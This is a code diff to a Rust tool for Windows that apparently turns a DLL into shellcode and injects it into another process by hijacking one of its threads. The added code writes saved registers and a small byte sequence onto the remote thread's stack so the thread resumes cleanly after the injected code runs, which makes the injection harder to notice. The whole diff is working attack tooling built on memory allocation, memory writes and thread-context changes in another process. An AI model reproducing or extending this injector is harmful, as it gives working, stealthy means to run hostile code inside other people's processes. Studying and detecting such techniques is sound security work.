@@ -31,6 +31,11 @@ use windows::Win32::{
     },
 };
 
+const RESTORE_SAVED_REGS_ON_STACK_CODE: &[u8] = &[
+    0x58, 0x5b, 0x59, 0x5a, 0x5d, 0x5e, 0x5f, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x41, 0x5b, 0x41,
+    0x5c, 0x41, 0x5d, 0x41, 0x5e, 0x41, 0x5f, 0xc2, 0x08, 0x40,
+];
+
 struct HandleGuard(HANDLE);
 impl Drop for HandleGuard {
     fn drop(&mut self) {
@@ -78,9 +83,13 @@ fn dll_to_shellcode(dll_path: &Path, dll_to_shellcode_path: &Path) -> anyhow::Re
 
 fn run_remote_shellcode(pid: u32, shellcode: &[u8]) -> anyhow::Result<()> {
     let tid = find_first_thread_of_process(pid).context("failed to find thread of process")?;
+    let proc_handle = HandleGuard(unsafe {
+        OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid)
+            .context("failed to open process")
+    }?);
     println!("[*] injecting to thread with TID {}", tid);
-    let shellcode_addr = allocate_shellcode_in_remote_process(pid, shellcode)?;
-    run_shellcode_in_remote_thread(tid, shellcode_addr)?;
+    let shellcode_addr = allocate_shellcode_in_remote_process(&proc_handle, shellcode)?;
+    run_shellcode_in_remote_thread(&proc_handle, tid, shellcode_addr)?;
     Ok(())
 }
 
@@ -118,7 +127,11 @@ fn initialize_context(flags: CONTEXT_FLAGS) -> anyhow::Result<(Vec<u8>, *mut CON
     Ok((ctx_buf, ctx_ptr))
 }
 
-fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyhow::Result<()> {
+fn run_shellcode_in_remote_thread(
+    proc_handle: &HandleGuard,
+    tid: u32,
+    shellcode_addr: usize,
+) -> anyhow::Result<()> {
     let thread_handle = HandleGuard(unsafe {
         OpenThread(
             THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
@@ -143,6 +156,41 @@ fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyh
     let shellcode_ctx = unsafe { &mut *shellcode_ctx_ptr };
     shellcode_ctx.ContextFlags = CONTEXT_FULL_X86;
     shellcode_ctx.Rip = shellcode_addr as u64;
+    shellcode_ctx.Rsp -= 0x4008 + core::mem::size_of::<SavedRegsOnStack>() as u64 + 8;
+
+    let restore_shellcode_addr =
+        allocate_shellcode_in_remote_process(proc_handle, RESTORE_SAVED_REGS_ON_STACK_CODE)
+            .context("failed to allocate restore shellcode in remote process")?;
+    write_proc_memory(
+        proc_handle,
+        shellcode_ctx.Rsp as usize,
+        as_raw_bytes(&restore_shellcode_addr),
+    )
+    .context("failed to write ret ip")?;
+    write_proc_memory(
+        proc_handle,
+        shellcode_ctx.Rsp as usize + 8,
+        as_raw_bytes(&SavedRegsOnStack {
+            rax: orig_ctx.Rax,
+            rbx: orig_ctx.Rbx,
+            rcx: orig_ctx.Rcx,
+            rdx: orig_ctx.Rdx,
+            rbp: orig_ctx.Rbp,
+            rsi: orig_ctx.Rsi,
+            rdi: orig_ctx.Rdi,
+            r8: orig_ctx.R8,
+            r9: orig_ctx.R9,
+            r10: orig_ctx.R10,
+            r11: orig_ctx.R11,
+            r12: orig_ctx.R12,
+            r13: orig_ctx.R13,
+            r14: orig_ctx.R14,
+            r15: orig_ctx.R15,
+            ret_ip: orig_ctx.Rip,
+        }),
+    )
+    .context("failed to write saved regs context to remote process")?;
+
     println!("[*] setting rip to 0x{:x}", shellcode_addr as u64);
     unsafe {
         SetThreadContext(thread_handle.0, shellcode_ctx).context("failed to set thread context")?
@@ -156,47 +204,75 @@ fn run_shellcode_in_remote_thread(tid: u32, shellcode_addr: *mut c_void) -> anyh
     Ok(())
 }
 
-fn allocate_shellcode_in_remote_process(pid: u32, shellcode: &[u8]) -> anyhow::Result<*mut c_void> {
-    let proc_handle = HandleGuard(unsafe {
-        OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid)
-            .context("failed to open process")
-    }?);
+fn as_raw_bytes<T>(value: &T) -> &[u8] {
+    unsafe {
+        core::slice::from_raw_parts(value as *const T as *const u8, core::mem::size_of::<T>())
+    }
+}
 
-    let allocated_addr = unsafe {
-        VirtualAllocEx(
-            proc_handle.0,
-            None,
-            shellcode.len(),
-            MEM_COMMIT,
-            PAGE_READWRITE,
-        )
-    };
-    ensure!(
-        !allocated_addr.is_null(),
-        "failed to allocate memory in the remote process"
-    );
+#[repr(C, packed)]
+struct SavedRegsOnStack {
+    rax: u64,
+    rbx: u64,
+    rcx: u64,
+    rdx: u64,
+    rbp: u64,
+    rsi: u64,
+    rdi: u64,
+    r8: u64,
+    r9: u64,
+    r10: u64,
+    r11: u64,
+    r12: u64,
+    r13: u64,
+    r14: u64,
+    r15: u64,
+    ret_ip: u64,
+}
 
+fn write_proc_memory(proc_handle: &HandleGuard, addr: usize, data: &[u8]) -> anyhow::Result<()> {
     let mut num_of_bytes_written = 0;
     unsafe {
         WriteProcessMemory(
             proc_handle.0,
-            allocated_addr,
-            shellcode.as_ptr().cast(),
-            shellcode.len(),
+            addr as *const c_void,
+            data.as_ptr().cast(),
+            data.len(),
             Some(&mut num_of_bytes_written),
         )
         .context("failed to write shellcode to remote process")?
     };
     ensure!(
-        num_of_bytes_written == shellcode.len(),
-        "not all shellcode bytes were copied"
+        num_of_bytes_written == data.len(),
+        "not all bytes were written"
     );
+    Ok(())
+}
+
+fn alloc_remote(proc_handle: &HandleGuard, len: usize) -> anyhow::Result<usize> {
+    let allocated_addr =
+        unsafe { VirtualAllocEx(proc_handle.0, None, len, MEM_COMMIT, PAGE_READWRITE) };
+    ensure!(
+        !allocated_addr.is_null(),
+        "failed to allocate memory in the remote process"
+    );
+    Ok(allocated_addr as usize)
+}
+
+fn allocate_shellcode_in_remote_process(
+    proc_handle: &HandleGuard,
+    shellcode: &[u8],
+) -> anyhow::Result<usize> {
+    let allocated_addr = alloc_remote(proc_handle, shellcode.len())?;
+
+    write_proc_memory(proc_handle, allocated_addr, shellcode)
+        .context("failed to write shellcode to remote process")?;
 
     let mut old_prot = PAGE_PROTECTION_FLAGS(0);
     unsafe {
         VirtualProtectEx(
             proc_handle.0,
-            allocated_addr,
+            allocated_addr as *const c_void,
             shellcode.len(),
             PAGE_EXECUTE,
             &mut old_prot,
